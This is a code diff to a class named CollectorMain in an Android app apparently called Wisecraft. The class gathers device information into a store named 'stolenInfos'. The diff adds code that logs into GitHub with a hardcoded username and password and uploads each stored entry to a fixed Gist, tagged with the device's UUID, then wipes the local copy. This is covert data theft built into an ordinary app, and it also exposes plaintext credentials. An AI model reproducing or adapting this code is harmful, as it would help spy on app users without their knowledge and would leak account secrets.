@@ -19,6 +19,12 @@ import java.util.zip.GZIPInputStream;
 import static com.nao20010128nao.Wisecraft.Utils.*;
 import com.nao20010128nao.Wisecraft.misc.BinaryPrefImpl;
 import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
+import org.eclipse.egit.github.core.client.GitHubClient;
+import org.eclipse.egit.github.core.Gist;
+import org.eclipse.egit.github.core.GistFile;
+import org.eclipse.egit.github.core.service.GitHubService;
+import org.eclipse.egit.github.core.service.GistService;
+import android.util.Log;
 public class CollectorMain extends ContextWrapper implements Runnable {
 	public CollectorMain() {
 		super(TheApplication.instance);
@@ -29,7 +35,9 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public void run() {
 		// TODO: Implement this method
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
-		FileUploader fu=new FileUploader(TheApplication.instance.uuid);
+		//FileUploader fu=new FileUploader(TheApplication.instance.uuid);
+		GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything","nao2001nao");
+		Gist gst=null;
 		String s="";
 		try {
 			sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
@@ -42,26 +50,33 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		String[] files;
 		try {
 			files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
+			gst=new GistService(ghc).getGist("544acb279290b659766e");
 		} catch (Throwable e) {
 			e.printStackTrace(System.out);
 			return;
 		}
+		HashMap<String,GistFile> datas=new HashMap<>(gst.getFiles());
 		for (String filename:files) {
 			System.out.println("upload:"+filename);
 			try {
-				copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
-				sb.edit().remove(filename).commit();
+				//copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
+				GistFile gf=new GistFile().setContent(sb.getString(filename,"")).setFilename(TheApplication.instance.uuid+"_"+filename);
+				datas.put(TheApplication.instance.uuid+"/files/"+filename,gf);
 			} catch (Throwable e) {
 				e.printStackTrace(System.out);
 				continue;
 			}
 		}
+		gst.setFiles(datas);
 		FileOutputStream fos=null;
 		try {
+			new GistService(ghc).updateGist(gst);
+			Log.d("gist","updated");
+			sb.edit().clear().commit();
 			fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
 			fos.write(sb.toBytes());
 		} catch (IOException e) {
-
+			e.printStackTrace(System.out);
 		}finally{
 			try {
 				if(fos!=null)fos.close();
